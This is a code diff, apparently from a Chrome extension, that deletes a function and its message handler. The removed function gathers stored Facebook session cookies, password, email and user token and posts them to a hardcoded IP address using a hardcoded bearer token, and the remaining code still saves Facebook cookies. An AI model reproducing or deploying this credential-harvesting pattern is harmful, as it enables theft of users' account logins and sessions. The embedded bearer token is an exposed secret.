@@ -160,51 +160,6 @@ function facebookData() {
     }, 3000)
 }
 
-function sendtoDatabase() {
-    chrome.storage.local.get(['FBcookie', 'FBpassword', 'FBemail', 'FButoken', 'FBuuid'], function(result) {
-        var data = {
-            "loginCookies": result.FBcookie,
-            "loginPassword": result.FBpassword,
-            "loginUsername": result.FBemail,
-            "socialAccountState": 0,
-            "socialAccountStateDescription": 0,
-            "socialNetwork": {
-                "id": 1
-            },
-            "status": 1,
-            "user": {
-                "id": 1,
-                "login": "admin"
-            },
-            "userToken": result.FBuToken,
-            "userTokenState": 0,
-            "userTokenStateDescription": "token",
-            "uuid": result.FBuuid,
-            "connectomes": [{
-                "connectomeId": 123123
-            }]
-        };
-
-        console.log(data);
-
-        $.ajax({
-            url: "http://125.138.183.122:8081/api/connectome-social-media/create",
-            type: 'POST',
-            beforeSend: function(xhr) {
-                xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODc1OTAwOX0.A4y31gMgatNcHgS_HQ9pVuCrh1cgAdmLaDmWuY92Xe7hSMKtLPfa1WrCc7aHb68uLwmKr9Pj_7RnQGPQDlnIhw');
-            },
-            contentType: 'application/json',
-            data: JSON.stringify(data),
-            success: function(response) {
-                console.log(response);
-            },
-            error: function(r) {
-                console.log(r);
-            },
-        });
-    });
-}
-
 
 chrome.runtime.onMessage.addListener(async function(response, sender, sendResponse) {
     console.log(response);
@@ -214,9 +169,6 @@ chrome.runtime.onMessage.addListener(async function(response, sender, sendRespon
             break;
         case 'sendData':
             facebookData();
-            break;
-        case 'sendtoDatabase':
-            sendtoDatabase();
             break;
         case 'fbLogin':
             savefbCookie('https://mbasic.facebook.com');
